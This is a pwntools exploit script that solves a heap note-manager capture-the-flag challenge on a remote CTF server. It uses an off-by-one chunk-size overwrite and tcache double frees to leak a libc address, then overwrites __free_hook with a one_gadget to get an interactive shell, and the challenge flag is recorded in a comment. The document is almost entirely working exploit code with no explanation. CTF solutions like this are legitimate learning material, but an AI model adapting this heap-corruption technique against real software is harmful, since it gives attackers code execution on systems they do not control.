#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.29.so")

context.binary = exe
r = None


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("pwn.chal.ctf.gdgalgiers.com", 1405) # pwn.chal.ctf.gdgalgiers.com 1405

    return r


def newNote(size, content):
    if not isinstance(content, bytes):
        content = content.encode()
    if not isinstance(size, bytes):
        size = str(size).encode()
    
    r.sendline(b'1')
    r.sendline(size)
    r.send(content)
    r.recvuntil(b'Note added')
   

def delNote(idx, no=False):
    if not isinstance(idx, bytes):
        idx = str(idx).encode()
    
    r.sendline(b'2')
    r.sendline(idx)
    
    if not no:
        r.recvuntil(b'Note removed')


def puts():
    r.sendline(b'3')
    r.recvuntil(b'option 3')


def viewNote(idx):
    if not isinstance(idx, bytes):
        idx = str(idx).encode()
    
    r.sendline(b'4')
    r.sendline(idx)
    r.recvuntil(b'This note is located at: ')
    adr = r.recv(14)
    content = r.readline()
    return int(adr, 16), content.strip()


def main():
    global r
    r = conn()
    
    size = 0x180+8
    
    MAX = 0x200-1
    
    
    newNote(size, "A"*(size-2)) # 0
    newNote(size, "B"*(size-2)) # 1
    # newNote(size, "hii") # 2
    
    adr, _ = viewNote(0)
    
    print(hex(adr))
    
    delNote(1)
    delNote(0)
    
    #pause()
    newNote(size, "a"*(size-1)) # 0, overwrite size of chunk 1 to 0x100
    
    delNote(1)
    
    pause()
    newNote(0x100-0x10, p64(adr+0x70+0x120-8) + b"D"*(0x100-0x10-8-2))
    newNote(size, "C"*(size-2))
    
    pause()
    newNote(size, p64(0x511) + b"E"*(size-2-8)) # Controlled adr
    
    delNote(3)
    delNote(3)
    
    delNote(3)
    newNote(MAX, "A"*(MAX-2))
    
    delNote(3)
    newNote(MAX, b"A"*(0x168) + p64(0xa1))
    
    delNote(1)
    adr, leak = viewNote(1)
    libc = u64(leak.ljust(8, b'\0')) - 0x1e4ca0
    
    one_gad = 0xe2383 + libc
    free_hook = 0x1e75a8 + libc
    
    print('base:', hex(libc))
    print('onegad:', hex(one_gad))
    print('free hook:', hex(free_hook))
    
    
    # arb write
    
    size = 0x130+8
    
    # # #
    
    newNote(size, "A"*(size-2)) # 0
    newNote(size, "B"*(size-2)) # 1
    # newNote(size, "hii") # 2
    
    delNote(1)
    delNote(0)
    
    #pause()
    newNote(size, "a"*(size-1)) # 0, overwrite size of chunk 1 to 0x100
    
    delNote(1)
    
    pause()
    newNote(0x100-0x10, p64(free_hook))
    newNote(size, "C"*(size-2))
    
    pause()
    newNote(size, p64(one_gad)) # Controlled adr
    
    delNote(0, no=True)

    r.interactive() # CyberErudites{1t$_n0t_1h4t_s3cur3_r1ght?}


if __name__ == "__main__":
    main()
